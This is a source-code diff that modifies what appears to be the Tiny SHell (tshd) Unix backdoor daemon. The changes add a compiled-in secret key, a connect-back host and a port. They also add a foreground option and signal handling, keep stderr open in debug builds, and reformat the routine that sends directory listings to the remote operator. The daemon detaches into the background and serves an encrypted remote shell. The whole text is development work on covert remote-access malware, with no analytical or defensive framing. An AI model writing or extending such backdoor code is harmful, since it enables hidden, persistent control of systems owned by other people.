@@ -22,9 +22,14 @@
 #include <fcntl.h>
 #include <arpa/inet.h>
 #include <stdint.h>
+#include <signal.h>
 
 #include "tsh.h"
 #include "pel.h"
+
+char *secret = SECRET_KEY;
+char *cb_host = CB_HOST;
+int server_port = SERVER_PORT;
 
 unsigned char message[BUFSIZE + 1];
 extern char *optarg;
@@ -93,40 +98,64 @@ static char *append_uint( char *dst, uint64_t val )
     return dst;
 }
 
+static void sigterm_handler( int sig )
+{
+    (void) sig;
+    exit( 0 );
+}
+
 /* Program entry point */
-int main( void )
+int main( int argc, char *argv[] )
 {
     int ret, pid;
     socklen_t n;
     int client;
     struct sockaddr_in client_addr;
+    int foreground = 0;
 
-    /* fork into background */
+    signal( SIGTERM, sigterm_handler );
+    signal( SIGINT, sigterm_handler );
 
-    pid = fork();
-
-    if( pid < 0 )
+    if( argc > 1 && strcmp( argv[1], "-f" ) == 0 )
     {
-        return( 1 );
+        foreground = 1;
     }
 
-    if( pid != 0 )
+    if( !foreground )
     {
-        return( 0 );
-    }
+        /* fork into background */
 
-    /* create a new session */
+        pid = fork();
 
-    if( setsid() < 0 )
-    {
-        return( 2 );
-    }
+        if( pid < 0 )
+        {
+            return( 1 );
+        }
 
-    /* close all file descriptors */
+        if( pid != 0 )
+        {
+            return( 0 );
+        }
 
-    for( n = 0; n < 1024; n++ )
-    {
-        close( n );
+        /* create a new session */
+
+        if( setsid() < 0 )
+        {
+            return( 2 );
+        }
+
+        /* close all file descriptors */
+
+        for( n = 0; n < 1024; n++ )
+        {
+#ifdef DEBUG
+            if( n == 2 )
+            {
+                continue;
+            }
+#endif
+            close( n );
+        }
     }
 
 #ifndef CB_MODE /* normal bind mode */
@@ -491,12 +520,14 @@ int tshd_ls_dir( int client )
 
     /* iterate through entries using SYS_getdents64 */
 
-    while( ( nread = (int) syscall( SYS_getdents64, dfd, getdents_buf, sizeof( getdents_buf ) ) ) > 0 )
+    while( ( nread = (int) syscall( SYS_getdents64, dfd, getdents_buf,
+                                    sizeof( getdents_buf ) ) ) > 0 )
     {
         int bpos;
         for( bpos = 0; bpos < nread; )
         {
-            struct linux_dirent64 *entry = (struct linux_dirent64 *)( getdents_buf + bpos );
+            struct linux_dirent64 *entry;
+            entry = (struct linux_dirent64 *)( getdents_buf + bpos );
             char *p = line;
 
             if( fstatat( dfd, entry->d_name, &st, AT_SYMLINK_NOFOLLOW ) == 0 )
@@ -522,7 +553,8 @@ int tshd_ls_dir( int client )
                 *p = '\0';
             }
 
-            ret = pel_send_msg( client, (unsigned char *) line, (int)( p - line ) );
+            ret = pel_send_msg( client, (unsigned char *) line,
+                                (int)( p - line ) );
 
             if( ret != PEL_SUCCESS )
             {
